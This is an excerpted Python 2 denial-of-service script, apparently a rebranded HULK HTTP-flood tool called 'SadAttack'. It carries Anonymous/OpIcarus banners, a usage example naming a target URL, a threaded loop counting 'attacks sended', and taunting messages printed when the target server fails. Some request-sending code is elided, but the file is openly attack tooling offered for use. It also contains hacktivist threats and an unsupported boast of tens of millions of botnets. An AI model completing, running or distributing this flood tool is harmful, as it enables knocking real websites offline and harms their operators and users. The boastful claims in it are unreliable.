...
#5afc3c0f68ff47b53b485fcd53e898a9######---->fapping attack ;D
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
#https://www.youtube.com/channel/UCopXNftaD99DuRyVZMEY48w#
#We are Anonymous.#
...
#global params                                                                                       
url=''                                                                                              ###############################
host=''                                                                                             #~~~~Created By Cloudy 2.0~~~~#
headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
headers_referers=[]                                                                                 #instagram.com/cloudyzx#
request_counter=0                                                                                   #~~~https://www.youtube.com/channel/UCopXNftaD99DuRyVZMEY48w~~~#
flag=0                                                                                              #~~~~~ Anonymous ~~~~~~#
safe=0                                                                                              ###############################
...
def usage():
	print """
		SadAttack Version 2.0 DDoS Tool Created By Cloudy 2.0 & Modified by Lucifer 
		Join @: http://instagram.com/cloudyzx
		New loaded Botnets: 39,445,657
		Usage: python akira.py (url)
		Example: python akira.py http://illuminatiofficial.org/
"""
	print "\a"
print \
"""                                                       
\033[1;m\033[1;31m
		  ...
		  / _ \ | |/ / | '__/ _` |   __) || | | |
		 / ___ \|   <| | | | (_| |  / __/ | |_| |
		/_/   \_\_|\_\_|_|  \__,_| |_____(_)___/  Developed By: Cloudy 2.0
				                         
\033[97m
\033[93m		________________________________________________________________________

		  ################## Smoking loud I'm a lonely cloud ##################
		  @Cloudy 2.0       # I'm a Cold Blooded Hacker		We Don't Forgive
		  @Lucifer          # I'm a Demon for Corruptor's	We Don't Forget
		  @isaac            # I'm a Bank destroyer		We Are Legion
		  @Razer            # I'm ANONYMOUS INDIA!		Epect Us..
		  ################### WE ARE ANONYMOUS, WE ARE FAMILY.! ###############
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print '#~~~~~~~> We Are Anonymous <~~~~~~~#~~~>Welcome for your sadness<~~#'
 			print '#~~~~~~> Belong your database <~~~~~#~~~~~~~~~>Hello admin<~~~~~~~~#'
 			print '#~~~~~~> Fuck your Firewall <~~~~~~~#~~~~>Fuck Your Government<~~~~#'
 			print '#~~~> Your Site will be down <~~~#~~~~~>By Cloudy 2.0 Mass DDoS<~~~#'
 			print '                                                                    '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>OpIcarus DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the OpIcarus in webserver Mass DDoS Tool"
		print "Created By Cloudy 20"
		print "Moddified By Lucifer"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
...
####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fapp all over your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->OpIcarusAttack :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
